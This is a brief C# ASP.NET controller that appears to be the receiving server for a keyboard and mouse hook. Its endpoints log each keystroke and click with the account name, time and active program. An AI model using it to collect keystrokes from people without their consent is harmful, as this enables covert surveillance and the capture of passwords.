using Microsoft.AspNetCore.Mvc;

namespace KeyboardHookReceiver;

[ApiController]
public class ReceiverController : Controller
{
    [HttpPost, Route("/keyboard")]
    public void ReceiveKeyboardActions(KeyboardInputDto json)
    {
        Console.WriteLine($"{json.Time} | {json.AccountName} pressed key[{json.KeyCode}] in {json.Program}");
    }

    [HttpPost, Route("/mouse")]
    public void ReceiveMouseActions(MouseClickPosInputDto json)
    {
        Console.WriteLine(
            $"{json.Time} | {json.AccountName} {json.clickSide}Clicked at pos({json.X}, {json.Y}) in {json.Program}");
    }
}

public abstract class BaseInputInfo
{
    public string? AccountName { get; set; }
    public string? Time { get; set; }
    public string? Program { get; set; }
}

public class MouseClickPosInputDto : BaseInputInfo
{
    public int X { get; set; }
    public int Y { get; set; }
    public string? clickSide { get; set; }
}

public class KeyboardInputDto : BaseInputInfo
{
    public int KeyCode { get; set; }
}